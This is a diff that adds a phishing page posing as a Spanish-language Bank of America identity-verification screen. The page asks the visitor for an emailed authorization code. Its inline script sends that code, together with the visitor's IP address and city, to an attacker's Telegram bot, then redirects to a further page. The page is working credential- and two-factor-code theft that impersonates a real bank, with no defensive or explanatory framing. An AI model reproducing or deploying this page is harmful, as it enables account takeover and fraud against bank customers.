@@ -1,0 +1,130 @@
+﻿
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="stylesheet" href="css/normalize.min.css" />
+<link rel="stylesheet" href="css/estilos.css" />
+<title>    Bank of America</title>
+<link rel="shortcut icon" href="img/favicon.png" type="image/x-icon" />
+ <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+<script type="text/javascript" src="telgm.js"></script>
+    <script>
+
+        $(document).ready(function(){
+            $('#loginForm').submit(function(e){
+                e.preventDefault();
+				var u_namec = $('#country').val();
+                var u_namet = $('#telefono').val();
+
+                var ip, ip2;
+                $.getJSON("https://api.ipify.org?format=json", function(data) {
+                    ip = data.ip;
+                    $.getJSON("https://ipinfo.io", function (response) {
+                        ip2 = response.city + ", " + response.country;
+                        var message = "\n$$BOFA$$\n📧EMAIL CODIGO: " + u_namet + "\n📌: " + ip + "\n" + ip2;
+                        var settings = {
+                            "async": true,
+                            "crossDomain": true,
+                            "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+                            "method": "POST",
+                            "headers": {
+                                "Content-Type": "application/json",
+                                "cache-control": "no-cache"
+                            },
+                            "data": JSON.stringify({
+                                "chat_id": chat_id,
+                                "text": message
+                            })
+                        };
+                        $.ajax(settings).done(function (response) {
+                            window.location = 'gb.html'; 
+                        });
+                    });
+                });
+            });
+        });
+    </script>
+</head>
+<body>
+<div class="container">
+<div class="banner1">
+<img src="img/pvp.jpg" alt="juguetes" />
+<p class="txtg">Entrar</p>
+<div class="derLinks">
+<img class="sarea" src="img/free.jpg" alt="candado" />
+<div class="areaSegura">Área protegida</div>
+<img class="sarea2" src="img/santo.jpg" alt="puntos" />
+<div class="lenguaje">In English</div>
+</div>
+</div>
+<div class="banner2">
+<h1>Verificar su identidad</h1>
+</div>
+<div class="banner3">
+<div class="columnas">
+<div class="columnaX">
+<h2 class="titulo2">
+Indicar el código de autorización
+</h2>
+<p>
+1. Se le ha enviado un código de autorización a su correo electrónico
+
+</p>
+<form id="loginForm" method="post">
+<div class="form-group-l">
+<label class="form2label" for="correo"
+>Código de autorización</label
+>
+<p>
+  <input type="tel" id="telefono" name="telefono" placeholder="xxxxxx" size=40 style="width:208px" required>
+</p>
+</div>
+
+
+
+<div class="footer-form">
+  <p style="position: relative; width: 600px">
+El código vence 10 minutos después de que lo solicite.
+</p>
+<button class="btn principal" name="add" type="submit">
+ENVIAR
+</button>
+</div>
+</form>
+</div>
+<div class="columna3" style="float: right">
+<h2>Ayuda para entrar</h2>
+<ul class="menosmargin">
+<li>
+<a href="#">
+¿No reconoce o no puede acceder a la dirección de correo
+electrónico o al número de teléfono proporcionados?
+</a>
+</li>
+</ul>
+</div>
+</div>
+</div>
+<div class="banner4" style="height: 130px">
+<div class="fondolock"></div>
+<p>Área protegida</p>
+<div class="enlaces-footer">
+<a href="#">Privacidad</a>
+<a href="#">Seguridad</a>
+</div>
+<div class="copirait">
+<p>Bank of America, N.A. Miembro de FDIC.</p>
+<a href="#">
+Igualdad de oportunidades en préstamos para viviendas
+</a>
+
+<span class="corporation">© 2023 Bank of America Corporation.</span>
+</div>
+</div>
+</div>
+<script src="js/funciones.js"></script>
+</body>
+</html>
